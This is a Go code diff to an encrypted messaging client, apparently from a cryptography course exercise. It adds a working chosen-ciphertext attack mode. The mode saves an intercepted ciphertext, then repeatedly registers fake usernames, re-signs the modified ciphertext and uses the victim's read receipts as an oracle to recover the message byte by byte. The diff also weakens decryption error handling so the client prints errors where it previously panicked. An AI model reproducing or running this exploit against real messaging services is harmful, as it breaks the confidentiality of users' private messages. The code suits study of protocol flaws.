@@ -47,6 +47,8 @@ var (
 	apiKey              string
 	doUserRegister      bool
 	headlessMode        bool
+	ciphertextFilename  string
+	victimUsername      string
 	messageIDCounter    int
 	attachmentsDir      string
 	globalPubKey        PubKeyStruct
@@ -387,6 +389,16 @@ func sendMessageToServer(sender string, recipient string, message []byte, readRe
 		return err
 	}
 
+	// Write the JSON string to a file
+	if username == "charlie" {
+		fmt.Printf("Message intercepted: %s\n", b64.StdEncoding.EncodeToString(message))
+		fileName := "ciphertext.txt"
+		err = os.WriteFile(fileName, body, 0644)
+		if err != nil {
+			return err
+		}
+	}
+
 	// Post it to the server
 	code, _, err := doPostRequest(posturl, body)
 	if err != nil {
@@ -597,28 +609,28 @@ func decryptMessage(payload string, senderUsername string, senderPubKey *PubKeyS
 
 	decodedPayload, err := b64.StdEncoding.DecodeString(payload)
 	if err != nil {
-		panic(err)
+		fmt.Println("Error decrypting messages:", err)
 	}
 
 	err = json.Unmarshal([]byte(decodedPayload), &ciphertext)
 	if err != nil {
-		panic(err)
+		fmt.Println("Error decrypting messages:", err)
 	}
 
 	toVerify := ciphertext.C1 + ciphertext.C2
 	sig, err := b64.StdEncoding.DecodeString(ciphertext.Sig)
 	if err != nil {
-		panic(err)
+		fmt.Println("Error decrypting messages:", err)
 	}
 
 	// 2. The recipient decodes `sigPK` into an ECDSA public key (point on P-256).
 	DecodedSigPK, err := b64.StdEncoding.DecodeString(senderPubKey.SigPK)
 	if err != nil {
-		panic(err)
+		fmt.Println("Error decrypting messages:", err)
 	}
 	sigPK, err := x509.ParsePKIXPublicKey(DecodedSigPK)
 	if err != nil {
-		panic(err)
+		fmt.Println("Error decrypting messages:", err)
 	}
 
 	// 3. The recipient verifies the signature `Sig` against message `toVerify` using ECDSA with P-256 under key `sigPK`.
@@ -634,28 +646,28 @@ func decryptMessage(payload string, senderUsername string, senderPubKey *PubKeyS
 	// 1. The recipient BASE64-decodes `C1` as a point on P-256.
 	c1, err := b64.StdEncoding.DecodeString(ciphertext.C1)
 	if err != nil {
-		panic(err)
+		fmt.Println("Error decrypting messages:", err)
 	}
 
 	parsed, err := x509.ParsePKIXPublicKey(c1)
 	if err != nil {
-		panic(err)
+		fmt.Println("Error decrypting messages:", err)
 	}
 
 	C1decoded, err := parsed.(*ecdsa.PublicKey).ECDH()
 	if err != nil {
-		panic(err)
+		fmt.Println("Error decrypting messages:", err)
 	}
 
 	// 2. The recipient decodes `encSK` as a scalar `s` between `0` and `q-1` (inclusive).
 	encSK, err := b64.StdEncoding.DecodeString(recipientPrivKey.EncSK)
 	if err != nil {
-		panic(err)
+		fmt.Println("Error decrypting messages:", err)
 	}
 
 	privK, err := x509.ParsePKCS8PrivateKey(encSK)
 	if err != nil {
-		panic(err)
+		fmt.Println("Error decrypting messages:", err)
 	}
 
 	s, _ := privK.(*ecdsa.PrivateKey).ECDH()
@@ -669,13 +681,13 @@ func decryptMessage(payload string, senderUsername string, senderPubKey *PubKeyS
 	// 1. The recipient BASE46-decodes `C2` as an octet string.
 	c2, err := b64.StdEncoding.DecodeString(ciphertext.C2)
 	if err != nil {
-		panic(err)
+		fmt.Println("Error decrypting messages:", err)
 	}
 
 	// 2. The recipient deciphers `C2` using ChaCha20 under `K`, using a zero IV to obtain `M'`.
 	M, err := chacha20.NewUnauthenticatedCipher(K[:], make([]byte, 12))
 	if err != nil {
-		panic(err)
+		fmt.Println("Error decrypting messages:", err)
 	}
 	plaintext := make([]byte, len(c2))
 	M.XORKeyStream(plaintext, c2)
@@ -691,14 +703,14 @@ func decryptMessage(payload string, senderUsername string, senderPubKey *PubKeyS
 	}
 
 	// 5. If `username != sender_username`, then abort decryption and reject.
-	parts := strings.SplitN(string(Mprime), ":", 2)
-	if parts[0] != senderUsername {
+	verifyUser := string(Mprime)[:len(senderUsername)]
+	if verifyUser != senderUsername {
 		return nil, errors.New("username != sender_username")
 	}
 
 	// 6. Otherwise, output `M`.
 
-	return []byte(parts[1]), nil
+	return []byte(string(Mprime)[len(senderUsername)+1:]), nil
 }
 
 // Encrypts a byte string under a (Base64-encoded) public string, and returns a
@@ -964,6 +976,98 @@ func generatePublicKey() (PubKeyStruct, PrivKeyStruct, error) {
 	return pubKey, privKey, nil
 }
 
+// attack mode to automatically intercept user's message and send decrypted hacking message
+func attack(ciphertextFile, victim string) error {
+	// Load the target ciphertext from the file
+	cipher, err := os.ReadFile(ciphertextFile)
+	if err != nil {
+		return errors.New("failed to load ciphertext")
+	}
+
+	// Convert the ciphertext to a MessageStruct
+	var message MessageStruct
+	if err := json.Unmarshal(cipher, &message); err != nil {
+
+		return errors.New("failed to parse ciphertext")
+	}
+
+	decodedPayload, _ := b64.StdEncoding.DecodeString(message.Payload)
+
+	var ct CiphertextStruct
+	json.Unmarshal(decodedPayload, &ct)
+	decryptedMessage := ""
+	c2Bytes, _ := b64.StdEncoding.DecodeString(ct.C2)
+	fakeUsername := "charlie:"
+	for b := 8; b < len(c2Bytes); b++ {
+		fakeUsername = fakeUsername + decryptedMessage
+		for i := 0; i < 255; i++ {
+			tempUsername := fakeUsername + string(rune(i))
+			//fmt.Println(tempUsername)
+			_ = registerUserWithServer(tempUsername, "abc")
+
+			// Connect and log in to the server
+			//fmt.Print("Logging in to server... ")
+			tempAPIkey, err := serverLogin(tempUsername, "abc")
+			if err != nil {
+				continue
+			}
+
+			//fmt.Println("success!")
+			username = tempUsername
+			apiKey = tempAPIkey
+
+			// Generate a fresh public key, then upload it to the server
+			globalPubKey, globalPrivKey, err = generatePublicKey()
+			_ = globalPrivKey // This suppresses a Golang "unused variable" error
+			if err != nil {
+				continue
+			}
+
+			err = registerPublicKeyWithServer(username, globalPubKey)
+			if err != nil {
+				continue
+			}
+
+			toSign := ct.C1 + ct.C2
+
+			result := ECDSASign([]byte(toSign), globalPrivKey)
+
+			ct.Sig = b64.StdEncoding.EncodeToString(result)
+
+			modifiedPayload, _ := json.Marshal(ct)
+
+			err = sendMessageToServer(tempUsername, victim, modifiedPayload, 0)
+			if err != nil {
+				return errors.New("failed to send modified ciphertext")
+			}
+
+			// Check for Alice's response
+			time.Sleep(time.Duration(100) * time.Millisecond) // Wait for a response
+			response, err := getMessagesFromServer()
+			if err != nil {
+				continue
+			}
+
+			dflag := 0
+			for _, j := range response {
+				if j.From == victim && j.ReceiptID != 0 {
+					// The modified ciphertext was successfully decrypted
+					decryptedMessage += string(rune(i))
+					fmt.Printf("Decrypted message: %s\n", decryptedMessage)
+					dflag = 1
+				}
+			}
+			if dflag == 1 {
+				break
+			}
+
+		}
+	}
+	fmt.Println(decryptedMessage)
+
+	return errors.New("no response received from victim")
+}
+
 func main() {
 
 	running := true
@@ -978,6 +1082,9 @@ func main() {
 	flag.BoolVar(&strictTLS, "stricttls", false, "don't accept self-signed certificates from the server (default accepts them)")
 	flag.BoolVar(&doUserRegister, "reg", false, "register a new username and password")
 	flag.BoolVar(&headlessMode, "headless", false, "run in headless mode")
+	flag.StringVar(&ciphertextFilename, "attack", "", "enable attack mode (filename of the ciphertext for the attack)")
+	flag.StringVar(&victimUsername, "victim", "", "username of the victim for the attack")
+
 	flag.Parse()
 
 	// Set the server protocol to http or https
@@ -995,6 +1102,16 @@ func main() {
 
 	// Set up the server domain and port
 	serverDomainAndPort = serverDomain + ":" + strconv.Itoa(serverPort)
+
+	// If we enabled attack mode
+	if ciphertextFilename != "" {
+		if victimUsername == "" {
+			fmt.Println("Ciphertext filename and victim username are required")
+			os.Exit(1)
+		}
+		attack(ciphertextFilename, victimUsername)
+		os.Exit(0)
+	}
 
 	// If we are registering a new username, let's do that first
 	if doUserRegister == true {
